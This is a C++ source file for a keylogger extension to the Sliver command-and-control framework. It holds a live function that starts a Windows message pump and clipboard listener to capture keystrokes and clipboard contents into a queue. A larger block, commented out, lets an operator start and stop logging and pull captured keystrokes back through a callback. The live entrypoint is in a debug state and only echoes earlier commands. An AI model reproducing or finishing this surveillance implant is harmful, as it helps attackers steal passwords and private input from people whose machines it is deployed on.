#include "pch.h"
//#include "parser.h"
#include "WinMsgHandler.h"
#include "SharedQueue.h"
//This is in essence the Sliver api, We have a goCallback to return data, and a defined entrypoint to receive input
//Init function can exist if needed
#include "keylogger.h"



//State Tracking Between calls
bool keypumpRunning = false;
std::unique_ptr<std::thread> messagePump{};
//std::mutex keylogs_mutex{};
std::shared_ptr<SharedQueue> _queue{};
std::unique_ptr<WinMsgHandler> msg_handler{};
char previouscommand[1024];
int callcount;

int initalize()
{
    const char test[] = "this is a test plz work";
    strncpy_s(previouscommand, 100, test, sizeof(test));
    callcount = 1;
    return 1;
}


int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
{
    //datap parser = { 0 };
    //BeaconDataParse(&parser, argsBuffer, bufferSize);
    //short cmd = BeaconDataShort(&parser); // 0 = stop 1 = start 2 = get logs
    //std::lock_guard<std::mutex> l{ keylogs_mutex };
    int cmd = -1;
    char buffer[1024];
    if (strnlen_s(previouscommand, 1000))
    {
       int len = snprintf(buffer, 1000, "prev command sad was: %s : %d", previouscommand, callcount++);
        callback(buffer, len);
    }
    else {
        int len = snprintf(buffer, 1000, "Prev command is sad empty: %d", callcount++);
        callback(buffer, len);
    }
    ZeroMemory(previouscommand, 1000);
    strncpy_s(previouscommand, 1000, argsBuffer, bufferSize);
    //if (bufferSize == 0)
    //{
    //    std::string msg{ "You must provide a command.\n\t0 = stop\n\t1 = start\n\t2 = get logs" };
    //    callback(msg.c_str(), msg.length());
    //}
    //else
    //{
    //    cmd = argsBuffer[0] - '0'; // atoi would return 0 if it couldn't convert, this will only return 0 if the first char is 0
    //}
    //switch (cmd)
    //{
    //case 0: //stop
    //    if (!keypumpRunning)
    //    {
    //        std::string msg{ "Currently not logging keystrokes, can't stop what we havn't started" };
    //        callback(msg.c_str(), msg.length());
    //    }
    //    else
    //    {
    //        SendMessageW(msg_handler->wHandle, WM_CLOSE, NULL, NULL);
    //        keypumpRunning = false;
    //        messagePump->join();
    //        messagePump.reset();
    //        _queue.reset();
    //        std::string msg{ "Keylogger stopped" };
    //        callback(msg.c_str(), msg.length());
    //    }
    //    break;
    //case 1: // start
    //    if (keypumpRunning)
    //    {
    //        std::string msg{ "Can't double start keylogger, refusing command" };
    //        callback(msg.c_str(), msg.length());
    //    }
    //    else
    //    {
    //        _queue = std::make_shared<SharedQueue>();
    //        messagePump = std::make_unique<std::thread>(&startKeylogger);
    //        
    //    }
    //    break;
    //case 2: // get logs
    //    if (!keypumpRunning)
    //    {
    //        std::string msg{ "Keylogger must be running to get its output" };
    //        callback(msg.c_str(), msg.length());
    //    }
    //    else
    //    {
    //        std::wstring results{};
    //        while (!_queue->empty())
    //        {
    //            results += _queue->Pop();
    //        }
    //        std::string utf8_results = _queue->convertToMultiByte(results);
    //        if (utf8_results.length() == 0)
    //        {
    //            std::string msg{ "No keystrokes have been captured" };
    //            callback(msg.c_str(), msg.length());
    //        }
    //        callback(utf8_results.c_str(), utf8_results.length());
    //    }
    //    break;
    //default:
    //{
    //    std::string msg{ "invalid command received" };
    //    callback(msg.c_str(), msg.length());
    //}
    //}

    return 0;
}

void startKeylogger()
{

    msg_handler = std::make_unique<WinMsgHandler>(_queue); //Create our window to capture messages
    MSG msg{ 0 };

    //Request Clipboard messages
    AddClipboardFormatListener(msg_handler->wHandle);
    keypumpRunning = true;
    while (keypumpRunning && GetMessageW(&msg, msg_handler->wHandle, 0, 0)) //Start our message pump
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    keypumpRunning = false; // Just in case we exited based on an error in capturing we'll reset running to false here
    RemoveClipboardFormatListener(msg_handler->wHandle);
    msg_handler.reset(nullptr);
}
